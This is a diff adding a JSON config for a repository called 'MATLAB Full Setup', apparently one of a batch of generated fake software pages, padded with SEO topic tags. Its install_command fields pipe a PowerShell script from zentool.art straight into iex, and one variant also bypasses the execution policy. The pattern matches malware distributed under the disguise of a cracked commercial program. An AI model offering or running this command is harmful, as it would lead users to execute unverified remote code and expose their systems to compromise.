@@ -1,0 +1,28 @@
+{
+  "repo": "MATLAB-Full-Setup",
+  "product": "MATLAB Full Setup",
+  "product_title": "MATLAB",
+  "kind": "developer",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "matlab-windows",
+    "matlab-config",
+    "matlab-integration",
+    "matlab-latest",
+    "developer-tools",
+    "scientific-computing",
+    "numerical-computing",
+    "data-analysis",
+    "simulation",
+    "matrix-lab",
+    "engineering-software",
+    "windows-development"
+  ],
+  "site": "zentool.art"
+}
